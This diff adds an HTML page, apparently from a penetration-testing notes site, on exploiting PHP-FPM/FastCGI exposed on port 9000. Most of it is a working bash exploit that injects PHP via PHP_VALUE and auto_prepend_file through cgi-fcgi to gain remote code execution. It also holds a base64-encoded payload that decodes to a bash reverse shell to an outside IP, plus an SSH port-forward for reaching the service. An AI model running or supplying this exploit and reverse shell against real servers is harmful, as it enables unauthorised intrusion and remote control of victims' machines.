@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/styles/walkthroughs.css">
+    <link href="/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/styles/prism/prism.js"></script>
+    <link rel="icon" type="image/x-icon" href="/images/favicon2.png">
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>PHP-FPM/FastCGI (TCP/9000)</h1>
+            <p>PHP-FPM (FastCGI Process Manager) is an alternative to the traditional PHP CGI interface</p>
+        </div>
+        <div class="notion-body">
+            <h2>Exploitation</h2>
+            <ul>
+                <h3>RCE</h3>
+                <ul>
+                    <p>Using the following code we are able to achieve Remote Code Execution:</p>
+                    <p>Remember to change the <b>FILENAMES</b> value and point to a valid php file inside the target machine</p>
+                    <pre><code class="language-bash">#!/bin/bash
+
+PAYLOAD="<?php echo '<!--'; system('whoami'); echo '-->';" 
+FILENAMES="/var/www/public/index.php" # Existing file path
+
+HOST=$1
+B64=$(echo "$PAYLOAD"|base64)
+
+for FN in $FILENAMES; do
+    OUTPUT=$(mktemp)
+    env -i \
+      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
+      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
+      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT
+
+    cat $OUTPUT
+done</code></pre>
+                <p>Insted of <b>system(whoami)</b> we can place a better payload</p>
+                <pre><code class="language-bash">system(base64_decode('YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuMjE1LjI1NC80NDQ0IDA+JjEi'))</code></pre>      
+                <p>Then in order to execute the exploit</p>
+                <pre><code class="language-bash">./exploit TARGET_IP</code></pre>      
+                <p>It may be possible that the port 9000 is no exposed so in case you have ssh access you can perform a port forward</p>
+                <pre><code class="language-bash">ssh -L 9000:127.0.0.1:9000 VICTIM_USERANE@VICTIM_IP</code></pre>
+            </ul>    
+            </ul>    
+        </div>
+    </div>
+</body>
+</html>
